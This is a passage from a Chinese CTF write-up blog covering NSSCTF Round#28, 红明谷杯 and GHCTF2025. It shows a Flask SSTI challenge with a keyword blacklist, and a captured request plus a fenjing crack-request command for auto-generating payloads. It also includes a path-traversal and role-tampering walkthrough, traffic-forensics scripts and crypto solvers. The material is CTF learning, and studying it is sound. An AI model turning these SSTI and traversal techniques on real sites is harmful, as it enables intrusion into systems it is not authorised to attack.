(abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;试一试&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;🧑‍💻&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure><p>看见了<code>render_template_string</code>，那就打<code>SSTI</code>，说实话折腾了好久焚尽，就是不行，好奇怪</p><p>最后去<code>wsl</code>里面试试，发现成功了。。。。<code>webui</code>和黑名单(这个我没<strong>fuzz</strong>，拿的别人<code>wp</code>的)，都失败了，最后参考<a href="https://www.bx33661.com/archives/nssround-28--webfang-xiang-ti-jie#Coding-Loving">这篇</a>，<code>crack-request</code><br>这是<strong>windows</strong>的，有点逆天<br><img src="https://picx.zhimg.com/80/v2-20aabab13a61704916d0d120c78745cf_1440w.png" alt=""><br>这是我<strong>wsl</strong>刚<code>pip install fenjing</code>的<br><img src="https://picx.zhimg.com/80/v2-f539c7f490a7e25aced89710414b05f1_1440w.png" alt=""></p><p>自己抓的包</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">POST /test HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Referer: http://node6.anna.nssctf.cn:<span class="number">24482</span>/</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=<span class="number">1733148706</span>,<span class="number">1733212021</span>,<span class="number">1733212157</span>,<span class="number">1733420774</span>; session=eyJ1c2VyIjoidGVzdCJ9.Z-Elfw.u8hpIKgL8gXSzLW0ayQI4Y3KYjw</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">136.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">136.0</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line"></span><br><span class="line">cmd=PAYLOAD</span><br></pre></td></tr></table></figure><p><code>python3 -m fenjing crack-request -f http.txt --host &quot;node6.anna.nssctf.cn&quot; --port 24482</code></p><h1 id="红明谷杯"><a href="#红明谷杯" class="headerlink" title="红明谷杯"></a>红明谷杯</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="异常行为溯源"><a href="#异常行为溯源" class="headerlink" title="异常行为溯源()"></a>异常行为溯源()</h3><p><strong>30万个流量包</strong>，数据解一次<code>base64</code>，还有提取中间的内容再解一次<code>base64</code>才能拿到<code>ip</code>，随便试了几个，不对，<code>python</code>脚本提的数据不太行，是时候补个<strong>流量分析工具</strong>了(bushi)，<code>NetA Pro</code>在整不知道用不用得上，试了一下没用，还是要靠脚本提</p><p>晚上找到了一篇<a href="https://nvme0n1p.dev/post/2025-hmg-wp">wp</a>，其他题目也可以参考</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from json import load</span></span><br><span class="line"><span class="keyword">from</span> pyshark <span class="keyword">import</span> FileCapture</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> FileCapture(input_file=<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\network_traffic.pcap&quot;</span>, keep_packets=<span class="literal">False</span>):</span><br><span class="line">        tcp = packet.tcp</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(tcp.payload.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)).decode()</span><br><span class="line">        data = b64decode(data).decode()</span><br><span class="line">        data = loads(data)</span><br><span class="line">        msg = data[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line">        <span class="built_in">type</span> = data[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">        msg = b64decode(msg).decode().strip()</span><br><span class="line">        f.write(msg+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>好好好，原来脚本要这样写，载入流量包这一块就没经验了，如果<code>wireshark</code>安装不是默认路径，得<a href="https://blog.csdn.net/qq_42411587/article/details/119909870">参考修改</a></p><p>然后就是<strong>正则匹配</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">logs = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>).readlines()</span><br><span class="line">log_match = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(\d+\.\d+\.\d+\.\d+) ?- - \[(.*) \+\d+\] &quot;(\w+) ([\w\/.-]+) HTTP\/1\.1&quot; \d+ \d+ &quot;-&quot; &quot;.*&quot;&#x27;</span>)</span><br><span class="line">ip_maps = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">    m = log_match.<span class="keyword">match</span>(log)</span><br><span class="line">    ip = m.group(<span class="number">1</span>)</span><br><span class="line">    time = m.group(<span class="number">2</span>)</span><br><span class="line">    time = datetime.strptime(time, <span class="string">&quot;%d/%b/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line">    method = m.group(<span class="number">3</span>)</span><br><span class="line">    url = m.group(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print(time_match.match(time).group())</span></span><br><span class="line">    ip_maps[ip] = ip_maps.get(ip, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line">ip_maps = <span class="built_in">sorted</span>(ip_maps.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_maps:</span><br><span class="line">    <span class="built_in">print</span>(ip, count)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的仓库"><a href="#简单的仓库" class="headerlink" title="简单的仓库"></a>简单的仓库</h3><p>先注册，然后抓包充值接口<br><img src="https://picx.zhimg.com/80/v2-468ee1cb3d384d48548f50216a923796_1440w.png" alt=""><br>发现应该是目录读取，<code>hvang/readme.txt</code>这样，直接读根目录<br><img src="https://picx.zhimg.com/80/v2-6ef314597817ff95786d6b131f99d298_1440w.png" alt=""><br>想办法读文件，这时候发现我们还是<code>guest</code>，继续抓包改一下权限<br><img src="https://picx.zhimg.com/80/v2-2b615198930c6101c1a05e19cc02c8a5_1440w.png" alt=""><br>之后可以下载文件，找到下载路径，查看<code>/flag.sh</code>，找到<code>flag</code>文件位置<br><img src="https://picx.zhimg.com/80/v2-15f2a2c40b856b1ff65df32a149d5971_1440w.png" alt=""><br><img src="https://picx.zhimg.com/80/v2-34fd1872100e1ae0a093d60d07a94dd9_1440w.png" alt=""></p><p>你这仓库<code>user</code>目录居然可以这样控制的，六百六十六啊</p><h3 id="日记本"><a href="#日记本" class="headerlink" title="日记本()"></a>日记本()</h3><p>还没来得及看，今天怎么一堆比赛啊QWQ，后面再找个<code>wp</code>补补</p><p>好吧，看了一下，不怎么好打</p><h2 id="Crypto-unsolved"><a href="#Crypto-unsolved" class="headerlink" title="Crypto(unsolved)"></a>Crypto(unsolved)</h2><h3 id="qaq"><a href="#qaq" class="headerlink" title="qaq"></a>qaq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">qaq = E.order()//qwq**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag = pad(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(),<span class="number">4</span>)</span><br><span class="line">flag_part = [bytes_to_long(flag[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_part:</span><br><span class="line">    P1 = qaq*E.random_element()</span><br><span class="line">    P2 = qaq*E.random_element()</span><br><span class="line">    out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c</span><br><span class="line">    output.append(<span class="built_in">pow</span>(out,qaq, pp))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267, 1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208, 1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316, 460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437, 1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265, 3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432, 3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437, 3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849, 380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175, 507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057, 533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250, 2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305, 3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676, 3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173, 1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895, 3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240, 571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942, 2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168, 2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241, 973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543, 1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863, 790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>好吧，在<code>MOV</code>攻击中看到过这个，<strong>Weil Pairing</strong>，没啥思路，不了解这东西<br>有空跟<code>wp</code>认真学一下</p><h3 id="ECBag"><a href="#ECBag" class="headerlink" title="ECBag"></a>ECBag</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">a, b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;a =&quot;</span>)), <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;b =&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([a%p, b%p, (a+b)%p, (a-b)%p])) == <span class="number">4</span></span><br><span class="line">E1 = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">E2 = EllipticCurve(Zmod(p), [a+b, a-b])</span><br><span class="line">P, Q = E1.gens()[<span class="number">0</span>], E2.gens()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">80</span></span><br><span class="line">s = [choice([<span class="number">0</span>, bytes_to_long(flag)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">sP, sQ = [_*P <span class="keyword">for</span> _ <span class="keyword">in</span> s], [_*Q <span class="keyword">for</span> _ <span class="keyword">in</span> s]</span><br><span class="line">AP, AQ = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)], [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">encP, encQ = <span class="built_in">sum</span>([AP[_]*sP[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]), <span class="built_in">sum</span>([AQ[_]*sQ[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, [AP, AQ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, [P.xy(), Q.xy(), encP.xy(), encQ.xy()])</span><br></pre></td></tr></table></figure><h3 id="else"><a href="#else" class="headerlink" title="else"></a>else</h3><p><a href="https://blog.weyung.cc/2025/03/22/2025%20%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20-%20Crypto/">未央师傅的wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-Round-28&quot;&gt;&lt;a href=&quot;#NSSCTF-Round-28&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF Round#28&quot;&gt;&lt;/a&gt;NSSCTF Round#28&lt;/h1&gt;&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/</id>
    <published>2025-03-09T18:00:00.000Z</published>
    <updated>2025-04-02T17:01:14.032Z</updated>
    
    <content type="html"><![CDATA[<p>诶，这里有老登偷偷炸鱼(bushi</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>无意中发现了一个<strong>在线Sagemath运行平台</strong>，<strong>10.4版本的</strong>，有需要可以使用(<br><a href="https://cocalc.com/features/sage">https://cocalc.com/features/sage</a></p><p>下面是我自己比赛的时候自己做的(密码是<code>river</code>没做，<code>web</code>做了前几题，赛后继续做)，然后再加上一点赛后学习别的师傅的<code>wp</code>整合起来的</p><h2 id="baby-factor"><a href="#baby-factor" class="headerlink" title="baby_factor"></a>baby_factor</h2><p>基础的<code>RSA</code>，过于简单，不写了</p><h2 id="baby-signin"><a href="#baby-signin" class="headerlink" title="baby_signin"></a>baby_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxx&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 182756071972245688517047475576147877841</span></span><br><span class="line"><span class="string">q= 305364532854935080710443995362714630091</span></span><br><span class="line"><span class="string">c= 14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line"><span class="string">n= 55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$e=4与\phi 不互素，经典AMM，还是一样，懒人直接上师兄的科技$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    xs = Zmod(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    xs = GF(p**k)(y).nth_root(n, <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">  xs = <span class="built_in">list</span>(<span class="built_in">set</span>(xs))</span><br><span class="line">  xs = [Integer(x) <span class="keyword">for</span> x <span class="keyword">in</span> xs]</span><br><span class="line">  <span class="keyword">return</span> xs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line">  r = product(rs)</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_n</span>(<span class="params">c, e, ps, ks=<span class="literal">None</span>, checker=<span class="literal">None</span>, ret1=<span class="literal">False</span></span>):</span><br><span class="line">  <span class="comment"># ps: p, q, ...</span></span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(ps, <span class="built_in">list</span>)</span><br><span class="line">  <span class="keyword">if</span> ks == <span class="literal">None</span>:</span><br><span class="line">    ks = [<span class="number">1</span>] * <span class="built_in">len</span>(ps)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(ps) == <span class="built_in">len</span>(ks)</span><br><span class="line">  ms = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps)):</span><br><span class="line">    mp = nthRSA_p(c, e, ps[i], ks[i])</span><br><span class="line">    ms += [mp]</span><br><span class="line">  total = product([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[Log] Doing crt.\nComplexity = %d: %s&#x27;</span> % (total, <span class="built_in">str</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> ms])))</span><br><span class="line"></span><br><span class="line">  res = []</span><br><span class="line">  Ps = [ps[i]**ks[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ps))]</span><br><span class="line">  <span class="keyword">for</span> msi <span class="keyword">in</span> tqdm(itertools.product(*ms), total=total):</span><br><span class="line">    m = crt(<span class="built_in">list</span>(msi), Ps)</span><br><span class="line">    <span class="keyword">if</span> checker == <span class="literal">None</span>:</span><br><span class="line">      res += [m]</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> checker(m):</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> ret1:</span><br><span class="line">        res += [m]</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">return</span> m</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genHeaderChecker</span>(<span class="params">hd</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">str</span>):</span><br><span class="line">    hd = hd.encode()</span><br><span class="line">  <span class="keyword">assert</span> <span class="built_in">isinstance</span>(hd, <span class="built_in">bytes</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkHeader</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">      <span class="keyword">if</span> hd <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkHeader</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genStrChecker</span>(<span class="params"><span class="built_in">dict</span>, n=<span class="number">65537</span></span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">checkStr</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      flag = long_to_bytes(<span class="built_in">int</span>(m)).decode()</span><br><span class="line">      <span class="keyword">for</span> fi <span class="keyword">in</span> flag[:n]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> fi <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="built_in">print</span>(flag)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> checkStr</span><br><span class="line"></span><br><span class="line">p= <span class="number">182756071972245688517047475576147877841</span></span><br><span class="line">q= <span 